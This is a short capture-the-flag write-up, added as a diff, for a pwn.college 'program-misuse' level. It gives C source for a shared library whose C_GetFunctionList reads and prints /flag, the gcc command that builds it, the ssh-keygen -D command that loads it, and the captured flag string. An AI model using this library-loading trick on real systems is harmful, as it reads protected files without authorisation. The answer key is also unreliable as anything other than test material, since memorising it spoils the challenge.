@@ -1,0 +1,22 @@
+#include <stdio.h>
+
+int C_GetFunctionList() {
+    FILE *file = fopen("/flag", "r"); // Open the file in read mode
+
+    // Read and print each character from the file
+    int ch;
+    while ((ch = fgetc(file)) != EOF) {
+        putchar(ch); // Print the character
+    }
+
+    fclose(file); // Close the file
+
+    return 0; // Return success
+}
+we found that ssh-keygen could be inputed a shared library so we tried 
+to create a library or a shared object after inputing we found that ssh 
+call C_GetFunctionList by making this function write the flag
+gcc ch51.c -o ch51 -no-pie -shared
+hacker@program-misuse~level51:~$ ssh-keygen  -D ./ch51
+
+pwn.college{oesakeNLtR1IqS5tLZ1__hSytfN.01M5EDL1kjMzQzW}
